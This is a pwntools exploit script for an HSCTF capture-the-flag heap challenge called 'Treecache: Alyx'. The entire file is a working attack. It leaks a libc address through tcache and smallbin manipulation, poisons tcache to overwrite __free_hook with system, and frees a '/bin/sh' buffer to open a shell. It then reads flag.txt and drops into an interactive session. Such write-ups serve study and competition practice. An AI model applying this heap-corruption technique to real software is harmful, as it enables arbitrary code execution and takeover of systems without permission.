from pwn import *
import random

# Setup
libc = ELF('./libc.so.6')
p = process('./trees_alyx')
# Treecache 1
#p = remote('pwn.hsctf.com','5006')
# Treecache 2
#p = remote('pwn.hsctf.com','5009')
# Treecache: Alyx
#p = remote('pwn.hsctf.com','5008')

# Helper functions
def do_make():
	p.sendline('1')
def do_revoke(i):
	p.sendline('2')
	p.sendline(i)
def do_edit(i, name, len_desc, desc, amt):
	p.sendline('3')
	p.sendline(i)
	# The temp_null takes no name
	if int(i) > 0:
		p.sendline(name)
	p.sendline(len_desc)
	p.sendline(desc)
	p.sendline(amt)
def do_print(i):
	p.sendline('4')
	p.sendline(i)

input('[[ LEAK LIBC ]]')
# Standard: Put on smallbin; use malloc first-fit
print('[FILL TCACHE]')
DONATIONS = 0
for i in range(10):
	do_make()
	DONATIONS += 1
# We need lots of edit blocks
# This format keeps the heap readable
for i in range(1, 10+1):
	do_edit(str(i), chr(16+i)*8, str(256), chr(32+i)*32, str(16*i+i))
for i in range(1,7+1):
	do_revoke(str(i))
print('[OPEN SMALLBIN]')
# We've filled tcache; malloc is forced to put it on smallbin
do_revoke(str(8))
print('[EMPTY TCACHE]')
for i in range(7):
	do_make()
	DONATIONS += 1
print('[SPLIT SMALL CHUNK]')
# We're just splitting the edit smallbin chunk
do_make(); do_make()
DONATIONS += 2
print('[EXTRACT]')
# Boring extraction procedure
do_print(str(DONATIONS))
leak = p.recvuntil(' trees').split(b'\n')[-1]
leak = leak.split()[1]
leak = int(''.join(chr(c) for c in leak))
# Some precomputed offset
libc.address = leak + 0x7fe9226d0000 - 0x7fe9228b4da0
HOOK = libc.symbols['__free_hook']
SYSTEM = libc.symbols['system']
print('=== LIBC_BASE : {} ==='.format(hex(libc.address)))
print('=== FREE_HOOK : {} ==='.format(hex(HOOK)))
print('=== SYSTEM : {} ==='.format(hex(SYSTEM)))

input('[[ GET SHELL ]]')
print('[CLEAR TREE]')
# Clearing the tree sets root = temp_null
for i in range(DONATIONS+1):
	do_revoke(str(i))
print('[FREE TEMP_NULL]')
# To free, we need to have a left child
do_make()
DONATIONS += 1
do_revoke('0')
print('[CLEAR TREE]')
# We want to access temp_null again
do_revoke(str(DONATIONS))
print('[WRITE /BIN/SH]')
# While we're here, write in /bin/sh for safekeeping
do_edit(str(DONATIONS), '', str(373), '/bin/sh', '0')
print('[OVERWRITE TCACHE]')
# The freed chunk is set up so that the description pointer is top of tcache
# Let's write to it
# This chunk will be freed later; let's keep it clean
# Set everything else in the header to \x01 because why not
header = '\x01'*8*2*4
# Place our hook all over the top of tcache
addresses = ''.join(chr(c) for c in p64(HOOK)) * 40
do_edit('0', '', str(0x250-0x10), header + addresses, '0')
print('[OVERWRITE HOOK]')
# We placed hooks everywhere, so just pick your favorite size
do_edit('0', '', '373', p64(SYSTEM), '0')
# Now write to hook
print('[RUN SHELL]')
# Go ahead and free that /bin/sh we stored earlier
p.sendline('3')
p.sendline(str(DONATIONS))
p.sendline('irrelevant')
p.sendline('373')
print('[GET FLAG]')
p.sendline('cat flag.txt')
# Boring extraction procedure
flag = p.recvuntil('}').strip().split(b'\n')[-1]
flag = ''.join(chr(c) for c in flag)
flag = [part for part in flag.split() if 'flag' in part][0]
print('=== FLAG : "{}" ==='.format(flag))

# Be nice to the process after we're done
p.interactive()
p.close()
